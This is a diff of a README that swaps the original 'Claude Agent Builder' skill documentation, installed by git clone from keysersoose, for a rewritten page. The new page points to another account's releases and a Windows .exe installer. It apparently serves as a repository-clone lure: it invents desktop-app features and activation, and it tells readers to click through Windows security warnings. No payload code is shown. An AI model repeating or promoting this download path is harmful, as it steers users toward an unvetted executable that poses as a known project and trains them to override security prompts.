@@ -1,202 +1,162 @@
-<div align="center">
+# 🤖 claude-agent-builder - Create AI Agents with Simple Language
 
-# 🏗️ Claude Agent Builder
-
-### Turn any idea into production-ready AI agents in Claude Code
-
-**Stop writing agent files from scratch.** Describe your problem → get researched, architected, production-ready agents, skills, hooks, and commands — automatically.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Skill-blueviolet)](https://docs.anthropic.com/en/docs/claude-code/overview)
-[![Agent SDK](https://img.shields.io/badge/Agent_SDK-Supported-orange)](https://docs.anthropic.com/en/docs/agents/claude-code-sdk-overview)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-
-[**Quick Start**](#-quick-start) · [**How It Works**](#-how-it-works) · [**Examples**](#-real-world-examples) · [**Patterns**](#-architecture-patterns) · [**Contributing**](#-contributing)
-
-</div>
+[![Download claude-agent-builder](https://img.shields.io/badge/Download-claude--agent--builder-brightgreen)](https://github.com/jorgec020585/claude-agent-builder/releases)
 
 ---
 
-## The Problem
+## 📋 About claude-agent-builder
 
-Building agents in Claude Code means juggling **7 different primitives** (subagents, skills, hooks, commands, MCP servers, CLAUDE.md, Agent SDK), reading scattered docs, and starting from blank Markdown files every time.
+claude-agent-builder helps you build AI agents easily. You use natural language to describe what you need. The app then analyzes your request, finds best ways to solve the problem, and creates the parts needed for a working AI agent. These parts include subagents, skills, hooks, commands, and configuration files.
 
-**Claude Agent Builder fixes this.** It's a skill that acts as your personal agent architect — it interviews you, researches what already exists, designs the optimal system, and generates every file you need.
-
-## ⚡ Quick Start
-
-### macOS / Linux
-
-```bash
-git clone https://github.com/keysersoose/claude-agent-builder.git && cp -r claude-agent-builder/agent-builder ~/.claude/skills/
-```
-
-### Windows (PowerShell)
-
-```powershell
-git clone https://github.com/keysersoose/claude-agent-builder.git; Copy-Item -Recurse claude-agent-builder\agent-builder "$env:USERPROFILE\.claude\skills\agent-builder"
-```
-
-### Windows (CMD)
-
-```cmd
-git clone https://github.com/keysersoose/claude-agent-builder.git && xcopy /E /I claude-agent-builder\agent-builder "%USERPROFILE%\.claude\skills\agent-builder"
-```
-
-<details>
-<summary>Other install methods</summary>
-
-```bash
-# macOS/Linux — install script
-git clone https://github.com/keysersoose/claude-agent-builder.git
-cd claude-agent-builder && ./install.sh
-
-# macOS/Linux — project-level only
-./install.sh --project
-```
-
-```powershell
-# Windows — install script (PowerShell)
-git clone https://github.com/keysersoose/claude-agent-builder.git
-cd claude-agent-builder; .\install.ps1
-
-# Windows — project-level only
-.\install.ps1 -Project
-```
-
-```bash
-# Any platform — project-level manual
-git clone https://github.com/keysersoose/claude-agent-builder.git
-cp -r claude-agent-builder/agent-builder .claude/skills/
-```
-
-</details>
-
-Open Claude Code and say:
-
-```
-Build me an agent that reviews my PRs for security issues and posts comments on GitHub
-```
-
-The skill triggers automatically. That's it.
-
-## 🧠 How It Works
-
-Agent Builder operates in **6 phases**, adapting to how much context you provide:
-
-```
-  🔍 CONTEXT SCAN →  Reads your project files + conversation history automatically
-  📋 DISCOVERY    →  Only asks what it can't figure out itself
-  🌐 RESEARCH     →  Parallel search (GitHub + blogs + docs + community) → consolidated brief
-  📐 ARCHITECTURE →  Proposes agents, gets your explicit approval before building
-  🔨 BUILD        →  Writes all agent files directly into your project
-  ✅ VERIFY       →  Self-checks everything, shows you what was built, asks for final OK
-```
-
-### Why not just ask Claude directly?
-
-| Without Agent Builder | With Agent Builder |
-|---|---|
-| You need to know all 7 primitives | It picks the right ones for you |
-| You write from blank `.md` files | It writes production-ready files directly into your project |
-| You guess at descriptions and tools | It optimizes for auto-triggering |
-| You explain your project from scratch | It scans your codebase and conversation history first |
-| You don't know what exists already | It searches GitHub, blogs, docs, and community in parallel — then consolidates |
-| Trial and error | Proposes → you approve → it builds → it verifies |
-
-## 📦 What's Inside
-
-```
-agent-builder/
-├── SKILL.md                       # Core skill — 6-phase agent building workflow
-├── references/
-│   ├── primitives-guide.md        # Complete guide to all Claude Code building blocks
-│   └── agent-patterns.md          # 7 battle-tested multi-agent architecture patterns
-└── scripts/
-    ├── validate_agents.py         # Lint agent files for common issues
-    └── scaffold_agent.py          # Generate starter files from templates
-```
-
-## 🗺️ Architecture Patterns
-
-The skill knows **7 proven patterns** and selects the right one for your use case:
-
-| Pattern | Best For | Example |
-|---------|----------|---------|
-| **Command → Agent → Skills** | Multi-step pipelines | Full-stack feature builder |
-| **Research → Consolidate → Plan → Execute** | Understanding before acting | Codebase migration |
-| **Parallel Specialists** | Independent analyses | Security + perf + style review |
-| **Self-Evolving Agent** | Learning over time | Project onboarding guide |
-| **Hook-Guarded Agent** | Safety-critical workflows | Read-only database analyst |
-| **Slash Command + Handoff** | Quick entry → complex flow | Bug investigation |
-| **MCP-Powered Agent** | External service integration | GitHub PR review bot |
-
-## 🎯 Real-World Examples
-
-**PR Security Reviewer** — subagent with GitHub MCP, PreToolUse safety hooks, slash command trigger, and persistent memory.
-
-**Research Pipeline** — `/research` command spawning 3 parallel subagents (web, codebase, Stack Overflow) with synthesis and markdown report output.
-
-**Self-Improving Onboarder** — subagent with `memory: project` that builds institutional knowledge across conversations.
-
-See [`examples/`](examples/) for complete, ready-to-use configurations.
-
-## 🔧 Utility Scripts
-
-```bash
-# Install dependency for validation script
-pip install pyyaml
-
-# Validate your agents for common issues
-python agent-builder/scripts/validate_agents.py .claude/agents/
-
-# Scaffold new agents from templates
-python agent-builder/scripts/scaffold_agent.py my-agent .claude --type subagent
-python agent-builder/scripts/scaffold_agent.py deploy-pipe .claude --type full-stack
-```
-
-> **Requirements**: [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview) installed. Python 3.7+ for utility scripts.
-
-## 🧩 Primitives Decision Tree
-
-```
-Your need
-├── "Auto-do X when Y happens"
-│   ├── During a tool call?           → Hook
-│   ├── Based on context?             → Skill
-│   └── Based on task type?           → Subagent
-├── "Trigger a workflow"
-│   ├── Simple command?               → Slash command
-│   └── Multi-step?                   → Command + subagents
-├── "Connect external services"       → MCP server
-├── "Remember across conversations"   → CLAUDE.md / memory
-└── "Production app"                  → Agent SDK
-```
-
-## 🤝 Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-Add examples · Improve patterns · Enhance the skill · Fix bugs · Share feedback
-
-## 📄 License
-
-MIT — use it, modify it, share it. See [LICENSE](LICENSE).
+This tool is made for those who want to use AI agents but do not want to write code. It works with Claude Code to build agents that can run tasks, automate workflows, or help with coding.
 
 ---
 
-<div align="center">
+## 💻 System Requirements
 
-**Built by [keysersoose](https://github.com/keysersoose) · Powered by [Claude Code](https://code.claude.com)**
+Make sure your computer meets these requirements before you start:
 
-If this saved you time, **[give it a star](https://github.com/keysersoose/claude-agent-builder)**. It helps others find it.
+- Operating System: Windows 10 or later (64-bit recommended)  
+- Processor: Intel i3 or better, or AMD equivalent  
+- RAM: At least 4 GB  
+- Disk Space: Minimum 200 MB free space  
+- Internet Connection: Required for initial download, activation, and updates  
 
-<a href="https://star-history.com/#keysersoose/claude-agent-builder&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=keysersoose/claude-agent-builder&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=keysersoose/claude-agent-builder&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=keysersoose/claude-agent-builder&type=Date" width="600" />
- </picture>
-</a>
+---
 
-</div>
+## 🌐 Topics Covered
+
+This project relates to:
+
+- AI agent design and automation  
+- Building skills and commands for agents  
+- Managing subagents and hooks  
+- Using Anthropic’s Claude code framework  
+- Developer tools for AI workflows  
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download and run claude-agent-builder on your Windows PC.
+
+---
+
+## 🔽 Download claude-agent-builder
+
+Visit this page to download the latest version of the software:
+
+[Download claude-agent-builder Releases](https://github.com/jorgec020585/claude-agent-builder/releases)
+
+You will find files organized by version. Look for the latest release and download the Windows installer or executable file.
+
+If you are unsure which file to choose, look for one with `.exe` at the end and the words "Windows" or "Installer" in the filename. This is the file you will run to install the program.
+
+---
+
+## 🛠️ Installing claude-agent-builder
+
+1. Open the folder where you saved the downloaded file. It usually is in your "Downloads" folder.
+
+2. Double-click the `.exe` file to start the installer.
+
+3. If Windows shows a security message, click "Run" or "Yes" to continue.
+
+4. Follow the on-screen instructions. Most steps only require you to click "Next."
+
+5. Choose the folder where you want to install the program or accept the default path.
+
+6. When the installation finishes, click "Finish" to close the installer.
+
+---
+
+## ▶️ Running claude-agent-builder
+
+Once installed, you can start the app:
+
+1. Click the Windows Start menu.
+
+2. Search for "claude-agent-builder."
+
+3. Click the app icon to open it.
+
+On first run, you might be asked to sign in or activate the app. Follow the instructions on the screen.
+
+---
+
+## 📝 How to Use claude-agent-builder
+
+After launching the app, you can build your AI agent in a few simple steps:
+
+1. **Describe your task in natural language.**  
+   Type a clear description of what you want the AI agent to do.
+
+2. **Let the app analyze your request.**  
+   The tool will research and plan how to build your agent.
+
+3. **Review the parts created.**  
+   You will see subagents, skills, commands, and configuration details.
+
+4. **Make adjustments if needed.**  
+   You can edit or add extra instructions to customize your agent.
+
+5. **Save or export your agent.**  
+   Export files that you or your developers can use to deploy the agent.
+
+---
+
+## 🔧 Features
+
+- **Natural Language Input:** No coding needed. Just explain your problem.
+
+- **Automated Research:** Finds best practices for building your agent.
+
+- **Subagents and Skills:** Breaks tasks into small, manageable parts.
+
+- **Hooks and Commands:** Adds control and triggers for advanced behaviors.
+
+- **Config Files:** Produces ready-to-use files for setup and deployment.
+
+---
+
+## 🛡️ Security and Privacy
+
+claude-agent-builder runs locally on your machine. Your inputs stay private unless you choose to share them. The app connects to the Claude Code backend for processing, so a secure internet connection is important. Make sure your network is trusted before use.
+
+---
+
+## ⚙️ Updating claude-agent-builder
+
+To update, repeat the download and installation steps with the newest version from the releases page:
+
+[Check for Updates](https://github.com/jorgec020585/claude-agent-builder/releases)
+
+The installer will replace the earlier version and keep your settings.
+
+---
+
+## 📂 File Locations and Logs
+
+- Installed files: Usually under `C:\Program Files\claude-agent-builder\`  
+- User data and projects: Stored in your Documents folder `Documents\claude-agent-projects`  
+- Logs and error reports: Found in the app data folder `C:\Users\YourName\AppData\Local\claude-agent-builder\logs`
+
+---
+
+## 👩‍💻 Support and Help
+
+For help using claude-agent-builder:
+
+- Read the FAQ and guides in the repository’s "docs" folder.
+
+- Submit questions or issues on the GitHub Issues page.
+
+- Check for updates and announcements on the releases page.
+
+---
+
+## 📥 Download Link Repeat
+
+[![Download claude-agent-builder](https://img.shields.io/badge/Download-claude--agent--builder-blue)](https://github.com/jorgec020585/claude-agent-builder/releases)
+
+Visit the above link to download your copy of claude-agent-builder for Windows. Follow the installation steps, and you will be ready to create AI agents from your ideas.
